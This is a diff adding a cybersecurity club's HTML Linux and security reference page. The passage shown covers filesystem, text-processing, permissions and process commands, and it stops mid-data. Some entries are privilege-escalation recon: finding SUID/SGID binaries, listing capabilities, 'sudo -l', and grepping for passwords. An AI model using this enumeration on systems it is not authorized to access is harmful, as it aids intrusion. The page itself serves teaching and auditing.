@@ -1,0 +1,1152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>EWUCSC // Linux &amp; Security Field Guide</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#0a0f0d; --bg2:#0e1512; --panel:#121b17; --panel-2:#17221d; --line:#243530;
+  --text:#e6f0ea; --muted:#83a196; --muted-2:#5c7469;
+  --accent:#ffb454; --accent-dim:#a8792f; --teal:#54dbc4; --teal-dim:#2f9484; --red:#ff7a68;
+  --beg:#54dbc4; --int:#ffb454; --adv:#ff7a68;
+  --radius:10px;
+  box-sizing:border-box; padding-top:env(safe-area-inset-top,0px); padding-bottom:env(safe-area-inset-bottom,0px);
+}
+*{box-sizing:inherit; margin:0; padding:0;}
+html{scroll-padding-top:76px;}
+html,body{height:100%;}
+body{
+  background:var(--bg); color:var(--text); font-family:'Space Grotesk',system-ui,sans-serif;
+  -webkit-font-smoothing:antialiased; line-height:1.55;
+  background-image:
+    radial-gradient(circle at 15% 0%, rgba(84,219,196,.05), transparent 45%),
+    radial-gradient(circle at 85% 8%, rgba(255,180,84,.05), transparent 40%);
+}
+code,pre,.mono{font-family:'JetBrains Mono',monospace;}
+a{color:var(--teal);}
+::selection{background:rgba(255,180,84,.28);}
+::-webkit-scrollbar{width:9px;height:9px;}
+::-webkit-scrollbar-thumb{background:var(--line);border-radius:8px;}
+::-webkit-scrollbar-thumb:hover{background:var(--muted-2);}
+
+/* ---------------- topbar ---------------- */
+#topbar{
+  position:sticky; top:0; z-index:40; top:env(safe-area-inset-top,0px);
+  background:rgba(10,15,13,.86); backdrop-filter:blur(10px);
+  border-bottom:1px solid var(--line);
+  display:flex; align-items:center; gap:16px;
+  padding:12px 20px;
+}
+#topbar .brand{display:flex; align-items:center; gap:9px; white-space:nowrap; font-weight:700; font-size:15px;}
+#topbar .brand .dot{width:9px;height:9px;border-radius:50%;background:var(--accent);box-shadow:0 0 10px var(--accent);flex-shrink:0;}
+#topbar .brand small{display:block;color:var(--muted);font-weight:400;font-size:11px;font-family:'JetBrains Mono',monospace;}
+#menuToggle{display:none;background:var(--panel);border:1px solid var(--line);color:var(--text);width:38px;height:38px;border-radius:8px;font-size:16px;cursor:pointer;flex-shrink:0;}
+.searchwrap{flex:1;max-width:480px;position:relative;margin-left:auto;}
+.searchwrap svg{position:absolute;left:12px;top:50%;transform:translateY(-50%);opacity:.5;}
+#q{
+  width:100%;padding:10px 14px 10px 36px;border-radius:8px;border:1px solid var(--line);
+  background:var(--panel);color:var(--text);font-family:'JetBrains Mono',monospace;font-size:13px;outline:none;
+  transition:border-color .15s, box-shadow .15s;
+}
+#q:focus{border-color:var(--teal); box-shadow:0 0 0 3px rgba(84,219,196,.12);}
+#count{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--muted);white-space:nowrap;display:none;}
+@media (min-width:720px){ #count{display:block;} }
+
+/* ---------------- hero ---------------- */
+.hero{max-width:1300px;margin:0 auto;padding:54px 22px 30px;border-bottom:1px solid var(--line);}
+.hero .term{
+  font-family:'JetBrains Mono',monospace;font-size:13px;color:var(--teal);
+  background:var(--panel);border:1px solid var(--line);border-radius:8px;
+  padding:14px 16px;max-width:560px;min-height:118px;margin-bottom:22px;
+}
+.hero .term .ln{opacity:0;white-space:pre-wrap;}
+.hero .term .ln.show{opacity:1;}
+.hero .term .out{color:var(--muted);}
+.hero .term .caret{display:inline-block;width:7px;height:14px;background:var(--teal);vertical-align:-2px;animation:blink 1s step-end infinite;}
+@keyframes blink{50%{opacity:0;}}
+.hero h1{font-size:clamp(30px,4.6vw,50px);font-weight:700;letter-spacing:-.01em;max-width:16ch;line-height:1.08;}
+.hero h1 em{font-style:normal;color:var(--accent);}
+.hero p.lede{color:var(--muted);max-width:64ch;font-size:15.5px;margin:16px 0 26px;}
+.hero .stats{display:flex;gap:34px;flex-wrap:wrap;}
+.hero .stats div b{display:block;font-size:1.6rem;color:var(--accent);font-family:'JetBrains Mono',monospace;}
+.hero .stats div span{color:var(--muted);font-size:11.5px;}
+.hero .sources{margin-top:26px;display:flex;gap:8px;flex-wrap:wrap;}
+.hero .sources span{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--muted-2);border:1px solid var(--line);padding:4px 9px;border-radius:20px;}
+
+/* ---------------- layout ---------------- */
+.layout{max-width:1300px;margin:0 auto;display:flex;align-items:flex-start;}
+#sidebar{
+  width:270px;flex-shrink:0;padding:26px 10px 80px 22px;position:sticky;top:60px;
+  max-height:calc(100vh - 60px);overflow-y:auto;
+}
+#sidebar .topsec-label{
+  color:var(--text);font-size:12.5px;font-weight:600;margin:20px 0 6px 10px;
+  display:flex;align-items:center;gap:7px;
+}
+#sidebar .topsec-label:first-child{margin-top:0;}
+#sidebar .topsec-label .n{color:var(--accent-dim);font-family:'JetBrains Mono',monospace;font-size:10.5px;}
+#sidebar a{
+  display:block;padding:5px 10px;border-radius:6px;color:var(--muted);text-decoration:none;
+  font-size:12.5px;margin-bottom:1px;border-left:2px solid transparent;transition:color .12s,background .12s,border-color .12s;
+}
+#sidebar a:hover{color:var(--text);background:rgba(255,255,255,.03);}
+#sidebar a.active{color:var(--teal);border-left-color:var(--teal);background:rgba(84,219,196,.06);}
+
+main{flex:1;min-width:0;padding:30px 22px 120px;}
+
+.topsec{margin-bottom:52px;scroll-margin-top:76px;}
+.topsec .sechead{margin-bottom:22px;padding-bottom:14px;border-bottom:1px solid var(--line);}
+.topsec .sechead h2{font-size:23px;margin-bottom:5px;}
+.topsec .sechead p{color:var(--muted);font-size:13.5px;max-width:640px;}
+
+.group{margin-bottom:30px;scroll-margin-top:76px;}
+.grouphead{display:flex;align-items:center;gap:10px;margin-bottom:10px;flex-wrap:wrap;}
+.grouphead h3{font-size:16.5px;}
+.lvl{font-family:'JetBrains Mono',monospace;font-size:10px;padding:2px 8px;border-radius:20px;border:1px solid;text-transform:uppercase;letter-spacing:.03em;}
+.lvl.beg{color:var(--beg);border-color:var(--beg);}
+.lvl.int{color:var(--int);border-color:var(--int);}
+.lvl.adv{color:var(--adv);border-color:var(--adv);}
+
+.blk{margin-bottom:12px;}
+.blk:last-child{margin-bottom:0;}
+
+/* simple / table rows */
+table.cmdtable{width:100%;border-collapse:collapse;background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;}
+table.cmdtable tr{border-bottom:1px solid var(--line);}
+table.cmdtable tr:last-child{border-bottom:none;}
+table.cmdtable tr:hover{background:var(--panel-2);}
+table.cmdtable td{padding:9px 12px;font-size:12.8px;vertical-align:top;}
+td.cmd{color:var(--teal);width:36%;cursor:pointer;position:relative;white-space:pre-wrap;word-break:break-word;}
+td.cmd code{background:none;color:inherit;font-size:12.5px;}
+td.cmd:hover{color:var(--accent);}
+td.cmd .cp{float:right;opacity:0;color:var(--muted);font-size:10px;margin-left:8px;transition:opacity .12s;}
+td.cmd:hover .cp{opacity:1;}
+td.desc{color:var(--text);}
+td.desc .ex{margin-top:4px;color:var(--muted);font-family:'JetBrains Mono',monospace;font-size:11.3px;}
+
+table.table-plain{width:100%;border-collapse:collapse;background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;}
+table.table-plain tr{border-bottom:1px solid var(--line);}
+table.table-plain tr:last-child{border-bottom:none;}
+table.table-plain th{text-align:left;padding:9px 12px;font-size:11.5px;color:var(--muted);background:var(--panel-2);}
+table.table-plain td{padding:9px 12px;font-size:12.8px;}
+table.table-plain td.k{color:var(--accent);font-family:'JetBrains Mono',monospace;font-size:12px;white-space:nowrap;}
+
+/* examples style (name + variations) */
+.exrow{background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);margin-bottom:9px;overflow:hidden;}
+.exhead{display:flex;align-items:center;gap:12px;padding:10px 12px;background:var(--panel-2);border-bottom:1px solid var(--line);flex-wrap:wrap;}
+.exname{color:var(--accent);font-weight:600;font-size:13px;cursor:pointer;position:relative;background:none;}
+.exname .cp{opacity:0;color:var(--muted);font-size:10px;margin-left:6px;transition:opacity .12s;}
+.exname:hover .cp{opacity:1;}
+.exdesc{color:var(--muted);font-size:12.3px;}
+.exlist{padding:4px;}
+.exitem{display:grid;grid-template-columns:minmax(160px,1fr) 1.4fr;gap:0;border-bottom:1px solid var(--line);}
+.exitem:last-child{border-bottom:none;}
+.exitem code{padding:7px 10px;color:var(--teal);font-size:12px;cursor:pointer;word-break:break-word;position:relative;}
+.exitem code:hover{color:var(--accent);}
+.exitem code .cp{float:right;opacity:0;color:var(--muted);font-size:9.5px;margin-left:6px;}
+.exitem code:hover .cp{opacity:1;}
+.exitem span{padding:7px 10px;color:var(--text);font-size:12.2px;border-left:1px solid var(--line);}
+@media (max-width:640px){.exitem{grid-template-columns:1fr;} .exitem span{border-left:none;border-top:1px dashed var(--line);}}
+
+/* card grid (verbatim multi-line blocks) */
+.cardgrid{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
+@media (max-width:760px){.cardgrid{grid-template-columns:1fr;}}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;}
+.cardhead{display:flex;align-items:center;justify-content:space-between;gap:10px;padding:9px 13px;background:var(--panel-2);border-bottom:1px solid var(--line);}
+.cardhead h4{font-size:12.8px;color:var(--accent);font-weight:600;}
+.cpbtn{background:none;border:1px solid var(--line);color:var(--muted);font-family:'JetBrains Mono',monospace;font-size:10.5px;padding:3px 9px;border-radius:20px;cursor:pointer;transition:color .12s,border-color .12s;}
+.cpbtn:hover{color:var(--teal);border-color:var(--teal);}
+.card pre{padding:12px 14px;font-size:12px;color:#cfe8dc;overflow-x:auto;line-height:1.65;}
+.card ul.plainlist{list-style:none;padding:10px 14px;}
+.card ul.plainlist li{font-size:12.6px;color:var(--text);padding:4px 0 4px 16px;position:relative;}
+.card ul.plainlist li::before{content:"–";position:absolute;left:0;color:var(--muted-2);}
+
+/* steps */
+ol.steps{background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);padding:14px 16px 14px 34px;font-size:12.8px;color:var(--text);}
+ol.steps li{padding:6px 0;line-height:1.6;}
+ol.steps li a{color:var(--teal);text-decoration:underline;text-decoration-color:var(--teal-dim);text-underline-offset:2px;}
+ol.steps li a:hover{color:var(--accent);}
+ol.steps li code{background:var(--panel-2);border:1px solid var(--line);padding:1px 6px;border-radius:4px;font-size:11.8px;color:var(--accent);}
+ol.steps li b{color:var(--text);}
+
+/* note */
+.note{border-left:3px solid var(--accent);background:var(--panel);padding:10px 14px;border-radius:0 var(--radius) var(--radius) 0;font-size:12.6px;color:var(--muted);margin-top:8px;}
+
+/* links */
+.linkgrid{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
+@media (max-width:640px){.linkgrid{grid-template-columns:1fr;}}
+.linkcard{display:block;background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);padding:12px 14px;text-decoration:none;transition:border-color .12s,transform .12s;}
+.linkcard:hover{border-color:var(--teal);transform:translateY(-1px);}
+.linkcard h4{font-size:13px;color:var(--teal);margin-bottom:3px;}
+.linkcard p{font-size:12px;color:var(--muted);}
+
+/* empty state */
+#emptyState{display:none;text-align:center;padding:60px 20px;color:var(--muted);font-family:'JetBrains Mono',monospace;font-size:13px;}
+
+footer{border-top:1px solid var(--line);padding:26px 22px 70px;max-width:1300px;margin:0 auto;color:var(--muted);font-size:11.8px;font-family:'JetBrains Mono',monospace;display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;}
+
+#toTop{
+  position:fixed;bottom:22px;right:22px;width:42px;height:42px;border-radius:50%;
+  background:var(--panel);border:1px solid var(--line);color:var(--teal);cursor:pointer;
+  display:flex;align-items:center;justify-content:center;opacity:0;pointer-events:none;
+  transition:opacity .2s,transform .2s;z-index:30;
+}
+#toTop.show{opacity:1;pointer-events:auto;}
+#toTop:hover{transform:translateY(-2px);border-color:var(--teal);}
+
+@media (max-width:900px){
+  #sidebar{
+    position:fixed;left:0;top:0;bottom:0;z-index:50;background:var(--bg2);
+    width:270px;transform:translateX(-100%);transition:transform .2s;
+    top:env(safe-area-inset-top,0px);padding-top:70px;box-shadow:0 0 40px rgba(0,0,0,.5);
+  }
+  #sidebar.open{transform:translateX(0);}
+  #menuToggle{display:block;}
+  main{padding:22px 16px 100px;}
+  .hero{padding:38px 16px 26px;}
+}
+@media (prefers-reduced-motion:reduce){ *{animation:none!important;transition:none!important;} }
+</style>
+</head>
+<body>
+
+<div id="topbar">
+  <button id="menuToggle" aria-label="Toggle navigation">☰</button>
+  <div class="brand"><span class="dot"></span><div>EWUCSC Field Guide<small>linux &amp; security // merged reference</small></div></div>
+  <div class="searchwrap">
+    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.3-4.3"/></svg>
+    <input id="q" type="text" placeholder="search 700+ commands: chmod, nmap -sC, reverse shell..." oninput="filterAll(this.value)">
+  </div>
+  <div id="count"></div>
+</div>
+
+<div class="hero">
+  <div class="term" id="termBox"></div>
+  <h1>The complete <em>Linux &amp; Security</em> field guide</h1>
+  <p class="lede">Every command, table, and card from the club's four cheat sheets — combined, re-organized by topic, and searchable in one place. Nothing was trimmed: beginner fundamentals, full tool syntax, hardening checklists, CTF tricks, and the resource list all live here. Click any command to copy it.</p>
+  <div class="stats">
+    <div><b id="statCmds">0</b><span>commands &amp; entries</span></div>
+    <div><b id="statGroups">0</b><span>topic groups</span></div>
+    <div><b id="statSections">0</b><span>top-level sections</span></div>
+  </div>
+  <div class="sources">
+    <span>source: Linux &amp; Tools Cheat Sheet</span>
+    <span>source: The Linux Field Manual</span>
+    <span>source: Linux Commands Cheat Sheet</span>
+    <span>source: Linux Command Guide (Beginner→Advanced)</span>
+  </div>
+</div>
+
+<div class="layout">
+  <nav id="sidebar"></nav>
+  <main id="main"></main>
+</div>
+
+<div id="emptyState">No commands match that search.</div>
+
+<footer>
+  <span>Use only on systems you own or are authorized to test.</span>
+  <span>Maintained by EWU Cyber Security Club — Technical Wing.</span>
+</footer>
+
+<button id="toTop" aria-label="Back to top">↑</button>
+
+<script>
+/* =========================================================
+   DATA — every entry merged from the four source files.
+   ========================================================= */
+const SECTIONS = [
+{ title:"Foundations", desc:"The filesystem layout, moving around it, and the text tools you'll reach for constantly.", groups:[
+  { id:"fs-hierarchy", title:"Filesystem Hierarchy (FHS)", blocks:[
+    { t:'table', cols:['Path','Purpose'], rows:[
+      ["/","Root of the entire filesystem"],
+      ["/bin, /sbin","Essential user & system binaries"],
+      ["/etc","System-wide config (passwd, shadow, crontab, hosts)"],
+      ["/home, /root","User home dirs / root's home"],
+      ["/var","Logs (/var/log), mail, spool data"],
+      ["/tmp","World-writable scratch space — common attack vector"],
+      ["/proc, /sys","Virtual views into the running kernel"],
+      ["/dev","Device files (disks, USB, ttys)"],
+      ["/usr, /opt","Installed apps / third-party software"],
+    ]},
+  ]},
+  { id:"nav", title:"Navigation & File Operations", level:'beg', blocks:[
+    { t:'simple', rows:[
+      ["ls -lah","List all files with sizes, incl. hidden"],
+      ["cd /path && pwd","Change directory / print working dir"],
+      ["cp -rp src dest","Copy recursively, preserve permissions"],
+      ["mv old new","Move or rename a file/dir"],
+      ["rm -rf dir/","Force-remove a directory recursively"],
+      ["mkdir -p a/b/c","Create nested directories"],
+      ["ln -s target link","Create a symbolic link"],
+      ["find / -iname \"*.conf\" 2>/dev/null","Find files by name, case-insensitive"],
+      ["find / -mmin -10 -type f 2>/dev/null","Files modified in the last 10 minutes"],
+      ["locate filename","Fast search using the file database"],
+      ["stat file.txt","Detailed file metadata"],
+    ]},
+    { t:'simple', rows:[
+      ["ls -la","List every file in a directory, including hidden ones, with permissions, owner, and size.","ls -la /etc"],
+      ["find / -iname \"*.conf\"","Search the whole filesystem for files matching a name pattern, case-insensitive.","find / -iname \"*.log\" 2>/dev/null"],
+      ["du -sh *","Show the disk space used by each item in the current directory, human-readable.","du -sh /var/log/*"],
+      ["df -h","Show free and used space across all mounted filesystems.","df -h"],
+      ["tree -L 2","Render a directory as a visual tree, limited to a given depth.","tree -L 2 /etc"],
+      ["stat file","Inspect a file's inode data — permissions, owner, size, and exact timestamps.","stat /etc/passwd"],
+      ["ln -s target link","Create a symbolic link pointing at another file or directory.","ln -s /opt/app /usr/local/bin/app"],
+      ["lsblk -f","List block devices and partitions along with their filesystem type and mount point.","lsblk -f"],
+      ["rsync -avh src dst","Sync files or directories, preserving permissions and timestamps, copying only what changed.","rsync -avh /data/ backup/"],
+      ["lsof +D /path","List every open file handle under a given directory tree.","lsof +D /var/www"],
+      ["cp -r src dst","Recursively copy a directory and everything inside it.","cp -r /var/www /backup/www"],
+      ["mv src dst","Move or rename a file or directory.","mv report.txt report-old.txt"],
+      ["tar -czvf out.tar.gz dir","Compress a directory into a single gzipped tarball.","tar -czvf logs.tar.gz /var/log"],
+      ["diff -u file1 file2","Show a line-by-line, unified diff between two files.","diff -u old.conf new.conf"],
+      ["mkdir -p a/b/c","Create a nested directory path in a single command.","mkdir -p project/src/utils"],
+    ]},
+    { t:'ex', items:[
+      ["ls","List files and directories",[["ls -l","Long format listing"],["ls -a","Include hidden files"],["ls -lh","Long format, human-readable sizes"],["ls -R","List subdirectories recursively"]]],
+      ["cd","Change the current directory",[["cd /path/to/dir","Go to a specific directory"],["cd ..","Move up one level"],["cd -","Go back to the previous directory"]]],
+      ["pwd","Show the current working directory",[["pwd","Print working directory"],["pwd -P","Print physical path, symlinks resolved"]]],
+      ["mkdir","Create a new directory",[["mkdir dir","Create a directory"],["mkdir -p a/b/c","Create nested directories at once"],["mkdir -m 777 dir","Create with specific permissions"]]],
+      ["touch","Create an empty file or update timestamps",[["touch file.txt","Create a new empty file"],["touch -a file.txt","Update only access time"],["touch -m file.txt","Update only modification time"]]],
+      ["cp","Copy files and directories",[["cp file dest/","Copy a file"],["cp -r dir dest/","Copy a directory recursively"],["cp -a src dest","Preserve attributes and permissions"]]],
+      ["mv","Move or rename files and directories",[["mv file dest/","Move a file"],["mv old new","Rename a file"],["mv -i file dest/","Prompt before overwriting"]]],
+      ["rm","Delete files and directories",[["rm file","Delete a file"],["rm -r dir","Delete a directory and contents"],["rm -rf dir","Force-delete without prompting"]]],
+      ["find","Search for files in a directory hierarchy",[["find . -name \"*.txt\"","Find by name pattern"],["find / -mtime -1","Modified in the last day"],["find / -size +100M","Files larger than 100MB"]]],
+      ["ln","Create links between files",[["ln -s target link","Create a symbolic link"],["ln target link","Create a hard link"]]],
+      ["file","Determine a file's type",[["file name","Show the file type"],["file *","Show types of all files here"]]],
+      ["stat","Show detailed file metadata",[["stat file","Size, permissions, timestamps"]]],
+    ]},
+    { t:'cards', cards:[
+      ["Moving around","pwd\ncd /path/to/dir\ncd -\nls -la\nls -lh\ntree -L 2\nstat file.txt\nreadlink -f file.txt\nbasename /a/b/file.txt\ndirname /a/b/file.txt"],
+      ["Finding things","find / -iname \"*.conf\" 2>/dev/null\nfind / -mmin -10 2>/dev/null\nfind / -size +10M -type f 2>/dev/null\nfind / -newer /tmp/ref -type f 2>/dev/null\nfind / -user root -perm -4000 2>/dev/null\nlocate filename.txt\nwhich python3\nwhereis nginx\ntype ls"],
+      ["Copy, move, delete","cp -r src/ dst/\ncp -a src/ dst/\nmv old.txt new.txt\nrm -rf folder/\nshred -u secret.txt\nmkdir -p /opt/proj/{src,build,docs}\nln -s /target /link\nrsync -avh src/ dst/"],
+      ["Viewing files","cat file.txt\ntac file.txt\nless file.txt\nhead -n 20 file.log\ntail -f file.log\ntail -n +5 file.log\ndiff file1 file2\nfile suspicious_bin"],
+    ]},
+  ]},
+  { id:"text", title:"Viewing & Text Processing", level:'beg', blocks:[
+    { t:'simple', rows:[
+      ["cat -n file.txt","View file with line numbers"],
+      ["head -n 20 file / tail -n 20 file","First / last N lines"],
+      ["tail -f /var/log/syslog","Follow a file live"],
+      ["grep -rniw 'password' /path","Recursive, case-insensitive word search"],
+      ["grep -C 3 'error' file","Show 3 lines of context around match"],
+      ["wc -l file","Count lines in a file"],
+      ["sort file | uniq -c","Sort and count unique lines"],
+      ["awk '{print $1}' file","Print the first column"],
+      ["sed 's/old/new/g' file","Find and replace text"],
+      ["cut -d':' -f1 /etc/passwd","Extract a field by delimiter"],
+      ["diff -u f1 f2","Compare two files"],
+    ]},
+    { t:'ex', items:[
+      ["cat","Concatenate and display file contents",[["cat file","Print a file"],["cat f1 f2 f3","Print multiple files"],["cat f1 > new","Redirect into a new file"]]],
+      ["less","View a file one screen at a time",[["less file","Page through a file"],["less +10 file","Start at line 10"]]],
+      ["head","Output the first part of a file",[["head file","First 10 lines"],["head -n 20 file","First 20 lines"]]],
+      ["tail","Output the last part of a file",[["tail file","Last 10 lines"],["tail -n 20 file","Last 20 lines"],["tail -f file","Follow a growing file live"]]],
+      ["grep","Search for a pattern in text",[["grep \"pattern\" file","Search one file"],["grep -r \"pattern\" dir/","Search recursively"],["grep -i \"error\" file","Case-insensitive search"]]],
+      ["awk","Pattern-scanning and text-processing language",[["awk '{print $1}' file","Print the first field"],["awk -F: '{print $1}' /etc/passwd","Custom field separator"]]],
+      ["sed","Stream editor for filtering/transforming text",[["sed 's/old/new/g' file","Find and replace"],["sed -n '5,10p' file","Print a line range"]]],
+      ["cut","Extract sections from each line",[["cut -d':' -f1 file","Extract a field by delimiter"],["cut -c1-5 file","Extract first 5 characters"]]],
+      ["sort","Sort lines of text",[["sort file","Ascending order"],["sort -r file","Descending order"],["sort -n file","Numeric sort"]]],
+      ["uniq","Remove duplicate adjacent lines",[["uniq file","Print unique lines"],["sort file | uniq -c","Count occurrences of each line"]]],
+      ["wc","Count lines, words, and bytes",[["wc -l file","Count lines"],["wc -w file","Count words"]]],
+      ["diff","Compare two files",[["diff f1 f2","Show differences"],["diff -u f1 f2","Unified diff format"]]],
+      ["tee","Write output to screen and a file at once",[["cmd | tee file","Show and save output"],["cmd | tee -a file","Append instead of overwrite"]]],
+    ]},
+    { t:'cards', cards:[
+      ["grep","grep -rnw /var/log -e \"error\"\ngrep -i \"fail\" auth.log\ngrep -v \"^#\" config.conf\ngrep -c \"404\" access.log\ngrep -E \"192\\.168\\.[0-9]+\\.[0-9]+\" access.log\ngrep -A3 -B3 \"Traceback\" app.log\ngrep -l \"TODO\" *.py\nzgrep \"error\" archived.log.gz"],
+      ["sed / awk","sed 's/foo/bar/g' file.txt\nsed -n '10,20p' file.txt\nsed -i '/^#/d' config.conf\nawk '{print $1, $3}' data.log\nawk -F: '{print $1}' /etc/passwd\nawk '{sum+=$1} END{print sum}' nums.txt\nawk 'NR==FNR{a[$1]++;next} a[$1]' f1 f2"],
+      ["sort / uniq / cut","sort file.txt | uniq -c\nsort -k2 -n data.csv\nsort file.txt | uniq -d\ncut -d: -f1 /etc/passwd\ncut -c1-10 file.txt\nwc -l file.txt\ntr 'a-z' 'A-Z' < file.txt\npaste -d, file1 file2"],
+    ]},
+  ]},
+  { id:"redirection", title:"I/O Redirection & Pipes", level:'beg', blocks:[
+    { t:'simple', rows:[
+      ["cmd > file","Redirect stdout, overwrite"],
+      ["cmd >> file","Redirect stdout, append"],
+      ["cmd 2> file","Redirect stderr"],
+      ["cmd 2>/dev/null","Discard error output"],
+      ["cmd1 | cmd2","Pipe output of one command into another"],
+      ["cmd1 && cmd2","Run second only if first succeeds"],
+      ["cmd1 || cmd2","Run second only if first fails"],
+      ["cmd &","Run in the background"],
+    ]},
+    { t:'cards', cards:[
+      ["Pipes & redirection","cmd1 | cmd2\ncmd > out.txt 2>&1\ncmd >> append.log\ncmd < input.txt\ncmd1 | tee out.txt | cmd2\nxargs -I{} cp {} /backup/\nwatch -n 2 'ls -la'"],
+    ]},
+  ]},
+]},
+{ title:"Users, Permissions & Processes", desc:"Who can do what, and what's actually running on the box.", groups:[
+  { id:"perms", title:"Permissions & Ownership", level:'beg', blocks:[
+    { t:'simple', rows:[
+      ["chmod +x script.sh","Make a file executable"],
+      ["chmod 755 file","rwxr-xr-x"],
+      ["chmod 600 id_rsa","Private-key style permissions"],
+      ["chown user:group file","Change ownership"],
+      ["chown -R user:group dir/","Recursive ownership change"],
+      ["umask 022","Default permission mask for new files"],
+      ["find / -perm -4000 2>/dev/null","Find SUID binaries"],
+      ["find / -perm -2000 2>/dev/null","Find SGID binaries"],
+      ["find / -writable 2>/dev/null","Find world-writable files"],
+      ["getcap -r / 2>/dev/null","Files with Linux capabilities set"],
+    ]},
+    { t:'simple', rows:[
+      ["chmod 750 file","Set exact read/write/execute permissions for owner, group, and others.","chmod 750 script.sh"],
+      ["chown user:group file","Change the owning user and group of a file or directory.","chown www-data:www-data /var/www"],
+      ["useradd -m -s /bin/bash name","Create a new user with a home directory and a default shell.","useradd -m -s /bin/bash zaber"],
+      ["usermod -aG group user","Add an existing user to a supplementary group without removing others.","usermod -aG sudo zaber"],
+      ["passwd user","Set or change a user's password.","passwd zaber"],
+      ["chage -l user","View a user's password expiry and aging policy.","chage -l zaber"],
+      ["setfacl -m u:user:rwx path","Grant fine-grained access control list permissions beyond standard chmod.","setfacl -m u:zaber:rwx /data"],
+      ["id user","Show a user's UID, GID, and every group they belong to.","id zaber"],
+      ["visudo","Safely edit the sudoers file with built-in syntax checking.","visudo"],
+      ["umask 027","Set the default permission mask applied to every newly created file.","umask 027"],
+      ["deluser --remove-home user","Delete a user account together with their home directory.","deluser --remove-home zaber"],
+      ["groupadd name","Create a new user group.","groupadd developers"],
+      ["su - user","Switch to another user's full login shell and environment.","su - zaber"],
+      ["sudo -l","List the sudo privileges granted to the current user.","sudo -l"],
+      ["last -a","Show recent login history for every user.","last -a | head"],
+    ]},
+    { t:'ex', items:[
+      ["chmod","Change file or directory permissions",[["chmod 755 file","rwxr-xr-x"],["chmod +x file","Make executable"],["chmod -R 644 dir/","Recursive permission change"]]],
+      ["chown","Change file ownership",[["chown user:group file","Change owner and group"],["chown -R user:group dir/","Recursively"]]],
+      ["whoami","Show the current username",[["whoami","Print current username"]]],
+      ["id","Show user and group IDs",[["id","Current UID, GID, groups"],["id username","Info for a specific user"]]],
+      ["sudo","Run a command as another user (default root)",[["sudo cmd","Run as root"],["sudo -l","List what you're allowed to run"],["sudo -i","Start a root shell"]]],
+      ["su","Switch to another user account",[["su username","Switch user"],["su -","Switch to root with root's environment"]]],
+      ["useradd","Create a new user account",[["useradd -m name","Create user with a home directory"],["useradd -g group name","Assign a primary group"]]],
+      ["userdel","Delete a user account",[["userdel name","Remove the account"],["userdel -r name","Also remove home directory"]]],
+      ["passwd","Change a user's password",[["passwd","Change your own password"],["passwd -l name","Lock an account"]]],
+    ]},
+    { t:'table', cols:['File','Purpose'], rows:[
+      ["/etc/passwd","account list"],
+      ["/etc/shadow","hashed passwords, root-only"],
+      ["/etc/group","group memberships"],
+      ["/etc/sudoers","edit only via visudo"],
+    ]},
+    { t:'cards', cards:[
+      ["Permission bits","# -rwxr-xr--\n# type owner group other\n# r=4 w=2 x=1\nchmod 750 script.sh\nchmod +x binary\nchown -R www-data:www-data /var/www"],
+      ["User management","useradd -m -s /bin/bash name\npasswd name\nusermod -aG sudo name\nuserdel -r name\ngroupadd devs\ngpasswd -a name devs\nsu - name\nid name\ngroups name"],
+      ["Auditing perms","find / -perm -4000 -type f 2>/dev/null\nfind / -perm -2000 -type f 2>/dev/null\nfind / -perm -o+w -type d 2>/dev/null\nfind / -nouser -o -nogroup 2>/dev/null\ngetfacl file.txt\nsetfacl -m u:name:rwx file.txt\nsudo -l\numask"],
+    ]},
+  ]},
+  { id:"procs", title:"Processes, Services & System Info", level:'beg', blocks:[
+    { t:'simple', rows:[
+      ["ps auxf","All processes, tree view"],
+      ["top / htop","Real-time process monitor"],
+      ["kill -9 PID","Force-kill a process"],
+      ["systemctl status sshd","Check a service's status"],
+      ["systemctl list-units --type=service","List all running services"],
+      ["journalctl -u service -f","Follow a service's live logs"],
+      ["crontab -l","Current user's scheduled jobs"],
+      ["cat /etc/crontab","System-wide cron jobs"],
+      ["watch -n1 'ps aux'","Repeat a command every second"],
+    ]},
+    { t:'simple', rows:[
+      ["ps aux","Snapshot every running process with CPU, memory, and command line.","ps aux | grep nginx"],
+      ["htop","Live, interactive view of CPU and memory usage per process.","htop"],
+      ["kill -9 PID","Force-terminate a process immediately, bypassing graceful shutdown.","kill -9 4321"],
+      ["pkill -f name","Kill every process whose command line matches a pattern.","pkill -f python3"],
+      ["renice -n 10 -p PID","Change the scheduling priority of an already-running process.","renice -n 10 -p 4321"],
+      ["systemctl status service","Check whether a systemd-managed service is running and view recent logs.","systemctl status ssh"],
+      ["bg / fg / jobs","Move a job between background and foreground, or list active jobs in the shell.","bg %1"],
+      ["nohup cmd &","Run a command that keeps running after the terminal session closes.","nohup ./server.sh &"],
+      ["strace -p PID","Trace every system call a running process makes, live.","strace -p 4321"],
+      ["pstree -p","Visualize the parent-child tree of every process, with PIDs.","pstree -p 1"],
+      ["top -o %CPU","Sort the live process view by CPU usage to spot the heaviest processes.","top -o %CPU"],
+      ["kill -l","List every signal name and number that kill can send.","kill -l"],
+      ["free -h","Show memory and swap usage in human-readable form.","free -h"],
+      ["uptime","Show how long the system has been running and its load averages.","uptime"],
+      ["watch -n 2 cmd","Re-run a command every few seconds to watch its output change.","watch -n 2 \"ps aux | grep nginx\""],
+    ]},
+    { t:'ex', items:[
+      ["ps","Report a snapshot of running processes",[["ps aux","All processes, all users"],["ps auxf","Tree view of processes"]]],
